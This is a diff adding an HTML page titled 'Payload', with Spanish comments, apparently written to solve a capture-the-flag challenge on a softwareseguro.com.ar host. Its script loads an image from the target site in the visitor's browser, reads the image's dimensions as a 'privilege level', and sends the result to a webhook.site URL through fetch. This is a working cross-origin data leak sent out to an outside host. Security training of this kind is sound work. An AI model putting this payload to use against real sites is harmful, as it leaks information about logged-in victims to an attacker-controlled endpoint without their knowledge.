@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Payload</title>
+</head>
+<body>
+    <script>
+        // URL del sitio del desafío (la primera caja de texto)
+        const targetDomain = "https://chl-5c563e8a-c26f-4514-b39d-ac9ecd2c4cfd-imagen-importante.softwareseguro.com.ar";
+
+        // URL de tu webhook para recibir los datos
+        const webhookUrl = "https://webhook.site/9d9fe92c-0ce5-42bc-bfb2-bf5744a4ffd4";
+
+        // Creamos un nuevo objeto de imagen
+        const img = new Image();
+
+        // Esta función se ejecutará CUANDO la imagen se haya cargado correctamente
+        img.onload = function() {
+            // Obtenemos el ancho y alto real de la imagen
+            const width = this.naturalWidth;
+            const height = this.naturalHeight;
+
+            // Calculamos el nivel de privilegio
+            const privilegeLevel = width * height;
+
+            // Enviamos los datos a nuestro webhook usando fetch
+            fetch(`${webhookUrl}?level=${privilegeLevel}`);
+        };
+
+        // Si la imagen no carga (por ejemplo, la URL es incorrecta), registramos un error
+        img.onerror = function() {
+            fetch(`${webhookUrl}?error=image_not_found`);
+        };
+
+        // Asignamos la URL de la imagen de Pepe. El navegador la cargará automáticamente.
+        // Probamos con una ruta común. Si no funciona, tendrás que cambiar "/image".
+        img.src = `${targetDomain}/image`;
+    </script>
+</body>
+</html>
